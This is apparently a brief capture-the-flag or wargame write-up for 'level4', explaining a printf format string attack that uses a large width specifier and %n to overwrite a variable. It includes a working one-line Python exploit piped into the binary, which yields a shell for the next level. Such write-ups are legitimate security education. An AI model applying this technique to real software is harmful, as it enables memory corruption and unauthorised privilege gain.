After looking at the executable, it seems to be the same exploit as in level3
but with VERY big number in the variable. Unfortunately we can't write that many 
characters in the buffer to simply use the printf flag %n.

So after looking at the same page as before we found that 'printf format flags' 
can help us in this case.

(python -c "print '\x10\x98\x04\x08' + '%16930052x' + '%x'*10 + '%n'") | ./level4

Finally we have a shell with level5
